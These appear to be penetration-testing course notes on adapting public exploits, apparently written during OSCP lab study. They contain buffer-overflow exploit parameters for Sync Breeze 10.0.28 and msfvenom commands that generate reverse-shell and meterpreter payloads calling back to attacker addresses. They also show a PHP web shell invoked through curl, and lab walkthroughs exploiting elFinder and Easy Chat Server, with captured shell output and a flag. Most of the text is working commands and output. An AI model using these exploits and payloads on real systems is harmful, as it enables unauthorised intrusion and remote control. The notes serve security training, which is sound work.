
#### 13.1. Fixing Memory Corruption Exploits

###### 13.1.1. Buffer Overflow in a Nutshell


###### 13.1.2. Importing and Examining the Exploit

1.  Searching for available exploits for our vulnerable software using searchsploit
```
searchsploit "Sync Breeze Enterprise 10.0.28"
```

2. Sync Breeze 10.0.28 Exploit's Summary
```
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```

3. String concatenation example in Python
```
kali@kali:~$ python
...
>>> string1 = "This is"
>>> string2 = " a test"
>>> string3 = string1 + string2

>>> print(string3)
This is a test
```

###### 13.1.3. Cross-Compiling Exploit Code

1. Installing the mingw-w64 cross-compiler in Kali
```
sudo apt install mingw-w64
```

2. Errors displayed after attempting to compile the exploit using mingw-64
```
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'
```

3.  Successfully compiling the code after adjusting the mingw-w64 command to link the winsock library
```
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

kali@kali:~$ ls -lah
total 372K
drwxr-xr-x  2 root root 4.0K Feb 24 17:13 .
drwxr-xr-x 17 root root 4.0K Feb 24 15:42 ..
-rw-r--r--  1 root root 4.7K Feb 24 15:46 42341.c
-rwxr-xr-x  1 root root 355K Feb 24 17:13 syncbreeze_exploit.exe
```

4. Identifying the code lines responsible for the IP address and port
```
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("10.11.0.22");
server.sin_family = AF_INET;
server.sin_port = htons(80);
```

*Lab Exercise*
1. All answer in theory. 

###### 13.1.4. Fixing the Exploit

1. Changing the return address 
```
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```
2. Using msfvenom to generate a reverse shell payload that fits our environment
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
3. Compiling the modified exploit code using mingw-64
```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
ls -lah
```
4. Running the Windows exploit using wine
```
sudo wine syncbreeze_exploit.exe
```

###### 13.1.5. Changing the Overflow Buffer
Not important. 

#### 13.2. Fixing Web Exploits

###### 13.2.1. Considerations and Overview

###### 13.2.2. Selecting the Vulnerability and Fixing the Code
Follow the exploit changing method and execute accordingly. 

*Lab Exercise*
All answer are in walkthrough and exploit code. 

###### 13.2.3. Troubleshooting the "index out of range" Error

1. Python string split method
```
kali@kali:~$ python
...
>>> mystr = "Kali*-*Linux*-*Rocks"

>>> result = mystr.split("*-*")

>>> result
['Kali', 'Linux', 'Rocks']

>>> result[1]
'Linux'
```
2. Understanding the code  and Adding a print statement to see the string where the split method is invoked on
```
print "[+] String that is being split: " + location
```
3. Inspecting the print output and noticing the absence of the string defined in the csrf_param variable
```
python2 44976_modified.py
```
4.  Changing the csrf_param variable
```
csrf_param = "_sk_"
```
5. Successful exploitation output and Verifying if our exploit was successful by trying to execute whoami using the uploaded php shell
```
kali@kali:~$ curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami
www-data

```


*Lab Exercise*
1. Check out walkthrough code. 
2. Walkthrough 
```
1. Create payload accordings which is OSCP/13/44967_m.py 
2. Run payload. python2 44967_m.py
3. curl -k https://192.168.50.45/uploads/shell.php?cmd=cat%20/home/flag.txt
```
3. Walkthrough
```
HINTS
    Use directory-list-2.3-small.txt wordlist and give it some time.
    Some fake sample files will be needed for the exploit.
    Execute the exploit using python2 and provide the found application base address.

1. Find out the /sec directory using gobuster. 
gobuster dir -u http://192.168.244.46/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

2. Check out elFinder exploits. 
└─$ searchsploit elFinder
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command  | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
------------------------------------------- ---------------------------------
Shellcodes: No Results

3. Download 46481.py and the create image using convert. 
┌──(kali㉿kali)-[~/OSCP/13]
└─$ convert -size 32x32 xc:white SecSignal.jpg

4. Execute it and get shell and flag. 
┌──(kali㉿kali)-[~/OSCP/13]
└─$ python2 46481.py http://192.168.244.46/seclab/
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ cat flag.txt
OS{ec656d46a580df3acf9c771929a43537}
```
4. Walkthrough
```
HINTS
    Set the correct stageless/staged payload to catch the reverse shell.
    Don’t remove the NOP sled in the shellcode from the original exploit.
    There could be various versions of the exploit, but at least one of them should be effective.

1. nmap -T4 -A 192.168.244.213, Easy Chat Server exploit 50999.py
2. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.195 LPORT=4444 -f python -b "\x00\x20" -v shellcode
3. Add hex values in exploit. 
4. Recieve reverse shell. 
```
#### 13.3. Wrapping Up